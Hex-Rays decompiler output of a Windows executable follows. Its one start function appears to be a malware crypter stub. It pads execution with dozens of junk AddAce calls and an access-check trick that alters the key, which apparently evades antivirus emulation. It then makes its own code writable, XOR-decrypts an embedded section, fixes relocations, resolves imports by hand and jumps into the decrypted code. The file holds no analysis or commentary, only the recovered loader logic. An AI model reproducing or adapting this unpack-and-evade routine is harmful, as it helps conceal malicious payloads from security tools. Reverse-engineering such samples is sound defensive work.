/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// void __usercall __noreturn start(int@<ebx>);

//-------------------------------------------------------------------------
// Data declarations

char byte_401480[] = { '¯' }; // weak
_UNKNOWN loc_401C50; // weak
int dword_402760[168] =
{
  552222433,
  -1781584580,
  -1024512558,
  -39469778,
  1020570114,
  1467486177,
  -1922277052,
  704174700,
  -758769849,
  -669852106,
  1280179043,
  -219603465,
  330460650,
  -2132369378,
  -476892724,
  -1918661822,
  -1775496502,
  162791449,
  445454256,
  671195811,
  -1206597720,
  -1362954054,
  79181933,
  1788173373,
  -772700422,
  484385373,
  -757868056,
  -165423912,
  288833923,
  1659829673,
  -1343742807,
  1052151665,
  -2047939378,
  473138026,
  248289531,
  421267217,
  -1346038768,
  -905632421,
  -182536711,
  902800241,
  1584727772,
  -2076481367,
  549245749,
  -610394624,
  -689254255,
  1115158005,
  -31714568,
  523395452,
  -1928876646,
  -294175693,
  -2120120501,
  -1592123697,
  1054943012,
  770449662,
  779920591,
  -1094139616,
  -1473118645,
  1018564502,
  1389716487,
  -373637444,
  614537765,
  -364977865,
  -819074016,
  673151125,
  1536148720,
  -1768348209,
  121419279,
  -1135422108,
  636074686,
  925147418,
  552222433,
  -1781584404,
  -265805960,
  -816083004,
  261527845,
  1678195894,
  -1094954283,
  438692282,
  -516479839,
  -333387202,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
// extern BOOL (__stdcall *AreAnyAccessesGranted)(DWORD GrantedAccess, DWORD DesiredAccess);
// extern BOOL (__stdcall *AddAce)(PACL pAcl, DWORD dwAceRevision, DWORD dwStartingAceIndex, LPVOID pAceList, DWORD nAceListLength);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
char byte_404000[512] =
{
  '$',
  '7',
  'á',
  '>',
  'ê',
  ' ',
  'ì',
  '-',
  'Ï',
  '•',
  'x',
  '\x1F',
  '(',
  'ð',
  'Ä',
  '\x8F',
  '[',
  'Ï',
  '%',
  '™',
  '–',
  '\x0F',
  '¶',
  '<',
  '\a',
  'd',
  'Õ',
  'R',
  '¼',
  '¾',
  'º',
  'é',
  '%',
  '\x1A',
  '¡',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak


//----- (00401000) --------------------------------------------------------
void __usercall __noreturn start(int a1@<ebx>)
{
  int v1; // ebp
  unsigned int v2; // ebx
  int v3; // esi
  int v4; // esi
  int v5; // esi
  int v6; // esi
  int v7; // esi
  int v8; // esi
  int v9; // esi
  int v10; // esi
  int v11; // esi
  int v12; // esi
  int v13; // esi
  int v14; // esi
  int v15; // esi
  int v16; // esi
  int v17; // esi
  int v18; // esi
  int v19; // esi
  int v20; // esi
  int v21; // esi
  int v22; // esi
  int v23; // esi
  int v24; // esi
  int v25; // esi
  int v26; // esi
  int v27; // esi
  int v28; // esi
  int v29; // esi
  int v30; // esi
  int v31; // esi
  int v32; // esi
  int v33; // esi
  int v34; // esi
  int v35; // esi
  int v36; // esi
  int v37; // esi
  int v38; // esi
  int v39; // esi
  int v40; // esi
  int v41; // esi
  int v42; // esi
  int v43; // esi
  int v44; // esi
  int v45; // esi
  int v46; // esi
  int v47; // esi
  int v48; // esi
  int v49; // esi
  int v50; // esi
  int v51; // esi
  int v52; // esi
  int v53; // esi
  int v54; // esi
  int v55; // esi
  int v56; // esi
  int v57; // esi
  int v58; // esi
  int v59; // esi
  int v60; // esi
  int v61; // esi
  int v62; // esi
  int v63; // esi
  int v64; // esi
  int v65; // esi
  int v66; // esi
  int v67; // esi
  int v68; // esi
  int v69; // esi
  int v70; // esi
  int v71; // esi
  int v72; // esi
  int v73; // esi
  int v74; // esi
  int v75; // esi
  int v76; // esi
  int v77; // esi
  int v78; // esi
  int v79; // esi
  int v80; // esi
  int v81; // esi
  int v82; // esi
  int v83; // eax
  int v84; // ecx
  unsigned int v85; // edx
  int *v86; // esi
  char *v87; // ebp
  char *v88; // edi
  _WORD *v89; // ecx
  bool v90; // zf
  char *v91; // esi
  HMODULE LibraryA; // ebx
  int v93; // edi
  int v94; // eax
  FARPROC *v95; // esi
  bool v96; // sf
  FARPROC ProcAddress; // eax
  DWORD flOldProtect; // [esp+10h] [ebp-8h] BYREF
  char *i; // [esp+14h] [ebp-4h]

  v1 = 0;
  v2 = 2 * a1;
  v3 = AddAce(0, 0, 0, 0, 0) + 35;
  v4 = AddAce(0, 0, 0, 0, 0) + v3;
  v5 = AddAce(0, 0, 0, 0, 0) + v4;
  v6 = AddAce(0, 0, 0, 0, 0) + v5;
  v7 = AddAce(0, 0, 0, 0, 0) + v6;
  v8 = AddAce(0, 0, 0, 0, 0) + v7;
  v9 = AddAce(0, 0, 0, 0, 0) + v8;
  v10 = AddAce(0, 0, 0, 0, 0) + v9;
  v11 = AddAce(0, 0, 0, 0, 0) + v10;
  v12 = AddAce(0, 0, 0, 0, 0) + v11;
  v13 = AddAce(0, 0, 0, 0, 0) + v12;
  v14 = AddAce(0, 0, 0, 0, 0) + v13;
  v15 = AddAce(0, 0, 0, 0, 0) + v14;
  v16 = AddAce(0, 0, 0, 0, 0) + v15;
  v17 = AddAce(0, 0, 0, 0, 0) + v16;
  v18 = AddAce(0, 0, 0, 0, 0) + v17;
  v19 = AddAce(0, 0, 0, 0, 0) + v18;
  v20 = AddAce(0, 0, 0, 0, 0) + v19;
  v21 = AddAce(0, 0, 0, 0, 0) + v20;
  v22 = AddAce(0, 0, 0, 0, 0) + v21;
  v23 = AddAce(0, 0, 0, 0, 0) + v22;
  v24 = AddAce(0, 0, 0, 0, 0) + v23;
  v25 = AddAce(0, 0, 0, 0, 0) + v24;
  v26 = AddAce(0, 0, 0, 0, 0) + v25;
  v27 = AddAce(0, 0, 0, 0, 0) + v26;
  v28 = AddAce(0, 0, 0, 0, 0) + v27;
  v29 = AddAce(0, 0, 0, 0, 0) + v28;
  v30 = AddAce(0, 0, 0, 0, 0) + v29;
  v31 = AddAce(0, 0, 0, 0, 0) + v30;
  v32 = AddAce(0, 0, 0, 0, 0) + v31;
  v33 = AddAce(0, 0, 0, 0, 0) + v32;
  v34 = AddAce(0, 0, 0, 0, 0) + v33;
  v35 = AddAce(0, 0, 0, 0, 0) + v34;
  v36 = AddAce(0, 0, 0, 0, 0) + v35;
  v37 = AddAce(0, 0, 0, 0, 0) + v36;
  v38 = AddAce(0, 0, 0, 0, 0) + v37;
  v39 = AddAce(0, 0, 0, 0, 0) + v38;
  v40 = AddAce(0, 0, 0, 0, 0) + v39;
  v41 = AddAce(0, 0, 0, 0, 0) + v40;
  v42 = AddAce(0, 0, 0, 0, 0) + v41;
  v43 = AddAce(0, 0, 0, 0, 0) + v42;
  v44 = AddAce(0, 0, 0, 0, 0) + v43;
  v45 = AddAce(0, 0, 0, 0, 0) + v44;
  v46 = AddAce(0, 0, 0, 0, 0) + v45;
  v47 = AddAce(0, 0, 0, 0, 0) + v46;
  v48 = AddAce(0, 0, 0, 0, 0) + v47;
  v49 = AddAce(0, 0, 0, 0, 0) + v48;
  v50 = AddAce(0, 0, 0, 0, 0) + v49;
  v51 = AddAce(0, 0, 0, 0, 0) + v50;
  v52 = AddAce(0, 0, 0, 0, 0) + v51;
  v53 = AddAce(0, 0, 0, 0, 0) + v52;
  v54 = AddAce(0, 0, 0, 0, 0) + v53;
  v55 = AddAce(0, 0, 0, 0, 0) + v54;
  v56 = AddAce(0, 0, 0, 0, 0) + v55;
  v57 = AddAce(0, 0, 0, 0, 0) + v56;
  v58 = AddAce(0, 0, 0, 0, 0) + v57;
  v59 = AddAce(0, 0, 0, 0, 0) + v58;
  v60 = AddAce(0, 0, 0, 0, 0) + v59;
  v61 = AddAce(0, 0, 0, 0, 0) + v60;
  v62 = AddAce(0, 0, 0, 0, 0) + v61;
  v63 = AddAce(0, 0, 0, 0, 0) + v62;
  v64 = AddAce(0, 0, 0, 0, 0) + v63;
  v65 = AddAce(0, 0, 0, 0, 0) + v64;
  v66 = AddAce(0, 0, 0, 0, 0) + v65;
  v67 = AddAce(0, 0, 0, 0, 0) + v66;
  v68 = AddAce(0, 0, 0, 0, 0) + v67;
  v69 = AddAce(0, 0, 0, 0, 0) + v68;
  v70 = AddAce(0, 0, 0, 0, 0) + v69;
  v71 = AddAce(0, 0, 0, 0, 0) + v70;
  v72 = AddAce(0, 0, 0, 0, 0) + v71;
  v73 = AddAce(0, 0, 0, 0, 0) + v72;
  v74 = AddAce(0, 0, 0, 0, 0) + v73;
  v75 = AddAce(0, 0, 0, 0, 0) + v74;
  v76 = AddAce(0, 0, 0, 0, 0) + v75;
  v77 = AddAce(0, 0, 0, 0, 0) + v76;
  v78 = AddAce(0, 0, 0, 0, 0) + v77;
  v79 = AddAce(0, 0, 0, 0, 0) + v78;
  v80 = AddAce(0, 0, 0, 0, 0) + v79;
  v81 = AddAce(0, 0, 0, 0, 0) + v80;
  v82 = AddAce(0, 0, 0, 0, 0) + v81;
  if ( !AreAnyAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) )
    v82 -= 34;
  CloseHandle((HANDLE)0x59);
  v83 = VirtualProtect(start, 0x3000u, 0x40u, &flOldProtect);
  v85 = 0;
  while ( 1 )
  {
    v2 = (unsigned int)&AddAce + 2 * v2;
    if ( v1 == v82 )
      v1 = 0;
    v84 = v82 + 8 * v84;
    LOBYTE(v84) = byte_404000[v1];
    byte_401480[v85] ^= v84;
    v83 = v84 + 2 * v83;
    ++v85;
    ++v1;
    if ( v85 >= 0x1420 )
    {
      v86 = dword_402760;
      v87 = &byte_401480[-640];
      v88 = 0;
      i = 0;
      while ( 1 )
      {
        v89 = v86 + 2;
        if ( (unsigned int)(v86[1] - 8) >> 1 )
        {
          v2 = (unsigned int)(v86[1] - 8) >> 1;
          do
          {
            if ( (*v89 & 0xF000) == 12288 )
              *(_DWORD *)&v87[*v86 + (*v89 & 0xFFF)] += &byte_401480[-268436096];
            ++v89;
            --v2;
          }
          while ( v2 );
          v88 = i;
        }
        v88 += v86[1];
        i = v88;
        v2 = (unsigned int)&v89[2 * v2];
        v86 = (int *)((char *)v86 + v86[1]);
        if ( (unsigned int)v88 >= 0xE4 )
        {
          v90 = *(_DWORD *)&byte_401480[2796] == 0;
          v91 = &byte_401480[2780];
          for ( i = &byte_401480[2780]; !v90; i = v91 )
          {
            LibraryA = LoadLibraryA(&v87[*((_DWORD *)v91 + 3)]);
            v88 = (char *)(9 * (_DWORD)v88);
            if ( LibraryA )
            {
              v93 = *(_DWORD *)v91;
              if ( !*(_DWORD *)v91 )
                v93 = *((_DWORD *)v91 + 4);
              v94 = *(_DWORD *)&v87[v93];
              v88 = &v87[v93];
              v95 = (FARPROC *)&v87[*((_DWORD *)v91 + 4)];
              v96 = v94 < 0;
              if ( v94 )
              {
                do
                {
                  if ( v96 )
                    ProcAddress = GetProcAddress(LibraryA, (LPCSTR)*(unsigned __int16 *)v88);
                  else
                    ProcAddress = GetProcAddress(LibraryA, &v87[v94 + 2]);
                  *v95 = ProcAddress;
                  v88 += 4;
                  v94 = *(_DWORD *)v88;
                  ++v95;
                  v96 = *(int *)v88 < 0;
                }
                while ( *(_DWORD *)v88 );
              }
              v91 = i;
            }
            v91 += 20;
            v90 = *((_DWORD *)v91 + 4) == 0;
          }
          ((void (*)(void))loc_401C50)();
          ExitProcess(0);
        }
      }
    }
  }
}
// 401329: variable 'v84' is possibly undefined
// 402760: using guessed type int dword_402760[168];

// nfuncs=1 queued=1 decompiled=1 lumina nreq=0 worse=0 better=0
// ALL OK, 1 function(s) have been successfully decompiled
